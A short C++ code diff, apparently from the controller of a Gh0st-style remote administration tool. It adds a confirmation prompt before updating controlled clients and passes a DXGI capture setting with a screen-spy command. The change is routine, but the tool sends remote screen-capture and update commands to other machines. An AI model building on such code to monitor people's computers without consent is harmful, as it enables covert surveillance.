@@ -714,6 +714,10 @@ char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
 
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
+	if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"), 
+		_T("提示"), MB_ICONQUESTION | MB_YESNO))
+		return;
+
 	char path[_MAX_PATH], * p = path;
 	GetModuleFileNameA(NULL, path, sizeof(path));
 	while (*p) ++p;
@@ -775,9 +779,10 @@ VOID CMy2015RemoteDlg::OnOnlineWindowManager()
 
 
 VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
-{	
-	BYTE	bToken = COMMAND_SCREEN_SPY;
-	SendSelectedCommand(&bToken, sizeof(BYTE));
+{
+	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "DXGI");
+	BYTE	bToken[2] = { COMMAND_SCREEN_SPY, n };
+	SendSelectedCommand(bToken, sizeof(bToken));
 }
 
 VOID CMy2015RemoteDlg::OnOnlineFileManager()
